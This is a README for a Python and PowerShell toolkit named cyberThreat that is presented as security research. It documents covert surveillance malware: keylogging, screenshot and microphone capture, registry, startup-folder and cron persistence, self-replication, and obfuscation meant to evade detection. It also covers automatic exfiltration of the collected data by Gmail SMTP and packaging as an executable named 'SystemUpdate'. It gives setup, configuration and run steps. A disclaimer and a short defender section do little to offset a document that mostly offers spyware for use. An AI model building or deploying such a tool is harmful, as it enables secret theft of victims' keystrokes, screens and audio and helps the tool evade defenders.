# 🔒 Advanced Security Research Toolkit

A comprehensive modular toolkit for security research and penetration testing, featuring advanced stealth techniques, persistence mechanisms, and data exfiltration capabilities.

## ⚠️ **IMPORTANT DISCLAIMER**

This toolkit is provided **EXCLUSIVELY** for:
- **Educational purposes**
- **Authorized security research**
- **Penetration testing in controlled environments**
- **Red team operations with proper authorization**

**NEVER** use this toolkit against systems you don't own or have explicit permission to test. Users are responsible for ensuring compliance with applicable laws and regulations.

## 🚀 Features

### 🔐 **Advanced Stealth**
- String obfuscation and encryption
- Dynamic code loading
- Runtime stealth techniques
- Executable compilation with PyInstaller

### 📊 **Surveillance Capabilities**
- Keystroke logging
- Screenshot capture
- Audio recording
- System information collection
- Mouse activity monitoring

### 🎯 **Persistence Mechanisms**
- Registry persistence (Windows)
- Startup folder persistence
- Cron job persistence (Linux)
- Random file movement
- Self-replication

### 📧 **Data Exfiltration**
- SMTP email exfiltration
- Encrypted data transmission
- Automatic cleanup
- Rate limiting

### 🔧 **Auto-Installation**
- Automatic dependency installation
- Python and pip installation
- Cross-platform compatibility

## 📁 Project Structure

```
cyberThreat/
├── core/                       # Core modules
│   ├── __init__.py            # Module initialization
│   ├── communication.py       # Email exfiltration
│   ├── crypto_utils.py        # String obfuscation
│   ├── enhanced_installer.py  # Auto-installation
│   ├── persistence.py         # Persistence mechanisms
│   └── surveillance.py        # Data collection
├── main.py                    # Main entry point
├── stealth_loader.py          # Stealth loader
├── build_exe.py              # Executable builder
├── requirements.txt           # Dependencies
└── PowerShell/               # PowerShell version
    ├── StealthLoader.ps1
    ├── BuildStealth.ps1
    └── Modules/
```

## 🛠️ Installation

### Prerequisites
- Python 3.7 or higher
- pip package manager
- Internet connection (for dependency installation)

### Quick Setup

1. **Clone the repository**
   ```bash
   git clone https://github.com/yourusername/cyberThreat.git
   cd cyberThreat
   ```

2. **Create virtual environment**
   ```bash
   python3 -m venv venv
   source venv/bin/activate  # On Windows: venv\Scripts\activate
   ```

3. **Install dependencies**
   ```bash
   pip install -r requirements.txt // This is not Mandatory .
   python3 stealth_loader.py // Entry point to run the script.
   ```

## 🚀 Usage

### 1. **Configure Email Settings**
Edit `main.py` and update the `EMAIL_CONFIG`:

```python
EMAIL_CONFIG = {
    'email': 'your_email@gmail.com',      # Your Gmail address
    'password': 'your_app_password',      # Gmail app password
    'smtp_server': 'smtp.gmail.com',      # Gmail SMTP
    'smtp_port': 587,                     # TLS port
    'use_tls': True
}
```

**Important:** Use an app password, not your regular Gmail password!

### 2. **Run the Toolkit**

#### Option A: Direct Execution(Just Activate the Venv and Start the Option B)
```bash
python main.py
```

#### Option B: Stealth Loader (Recommended)
```bash
python stealth_loader.py
```

#### Option C: Build Executable
```bash
python build_exe.py
# Executable will be created in dist/SystemUpdate
```

## ⚙️ Configuration

### Surveillance Settings
```python
SURVEILLANCE_CONFIG = {
    'log_file': 'activity.log',
    'screenshot_interval': 300,  # 5 minutes
    'audio_interval': 900,       # 15 minutes
    'audio_duration': 10         # 10 seconds
}
```

### Persistence Settings
```python
PERSISTENCE_CONFIG = {
    'move_interval': 600,        # 10 minutes
    'enable_registry': True,
    'enable_startup': True
}
```

### Exfiltration Settings
```python
EXFILTRATION_CONFIG = {
    'report_interval': 3600,     # 1 hour
    'enable_immediate': True
}
```

## 🔧 Advanced Features

### String Obfuscation
The toolkit uses advanced string obfuscation to avoid detection:

```python
from core.crypto_utils import obfuscate_string, deobfuscate_string

# Obfuscate sensitive strings
encrypted = obfuscate_string("sensitive_data")
decrypted = deobfuscate_string(encrypted)
```

### Dynamic Loading
Modules are loaded at runtime to avoid static analysis:

```python
# Dynamic module loading
from core import SurveillanceEngine, PersistenceManager
```

### Executable Compilation
Build a standalone executable with PyInstaller:

```bash
python build_exe.py
```

## 🛡️ Stealth Features

### Detection Avoidance
- **String Encryption**: All sensitive strings are encrypted
- **Dynamic Loading**: Modules loaded at runtime
- **Function Obfuscation**: Function names and calls obfuscated
- **Executable Output**: Compiles to standalone .exe
- **Runtime Stealth**: Silent operation with minimal footprint

### Persistence Methods
- **Registry Persistence**: Windows registry auto-start
- **Startup Folder**: Startup folder shortcuts
- **Cron Jobs**: Linux cron persistence
- **Random Movement**: Periodic file relocation

## 📊 Monitoring and Logs

The toolkit creates several types of logs:
- **Activity Logs**: Keystrokes and mouse activity
- **Screenshots**: Periodic screen captures
- **Audio Recordings**: Microphone recordings
- **System Information**: Host details and configuration

All data is automatically exfiltrated via email at configured intervals.

## 🔍 Troubleshooting

### Common Issues

1. **Import Errors**
   ```bash
   pip install -r requirements.txt
   ```

2. **Email Authentication**
   - Use Gmail app passwords
   - Enable 2-factor authentication
   - Allow less secure apps

3. **Permission Errors**
   ```bash
   # On Linux/Mac
   chmod +x main.py
   
   # On Windows
   # Run as Administrator
   ```

4. **PyInstaller Issues**
   ```bash
   pip install --upgrade pyinstaller
   ```

### Debug Mode
For testing, you can enable debug output by modifying the configuration.

## 🚨 Security Considerations

### For Red Team Testing
- Use only in authorized environments
- Ensure proper cleanup after testing
- Monitor for unintended propagation
- Document all activities

### For Defenders
- Monitor for obfuscated Python execution
- Check for encrypted strings in scripts
- Look for unusual registry entries
- Monitor SMTP traffic for exfiltration

## 📝 Legal Notice

This software is provided for **educational and authorized testing purposes only**. Users are responsible for ensuring compliance with applicable laws and regulations. The authors assume no liability for misuse of this software.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🆘 Support

For issues or questions:
1. Check the troubleshooting section
2. Review the documentation
3. Test in isolated environment first
4. Create an issue with detailed information

---

**Remember: Always use this toolkit responsibly and legally!**

